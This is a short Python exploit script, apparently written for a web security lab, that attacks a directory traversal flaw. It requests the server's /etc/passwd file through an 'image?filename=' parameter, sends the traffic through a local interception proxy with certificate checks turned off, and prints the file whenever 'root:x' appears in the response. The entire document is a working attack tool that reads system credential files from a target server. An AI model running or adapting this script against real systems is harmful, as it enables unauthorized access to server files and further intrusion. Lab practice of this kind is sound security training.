import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def directory_traversal_exploite(url):
    path = url + '/image?filename=/etc/passwd'
    re = requests.get(path, verify=False,proxies=proxies)
    if 'root:x' in re.text:
        print("(+) Exploit Successful!")
        print("(+) Content of /etc/passwd are:")
        print(re.text)
    else:
        print("(+) Exploit unsuccessful")

def main():
    if len(sys.argv) != 2:
        print("Usages: %s <url>" % sys.argv[0])
        print("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("Exploiting directpry traversal vulnerability.....")
    directory_traversal_exploite(url)

if __name__ == "__main__":
    main()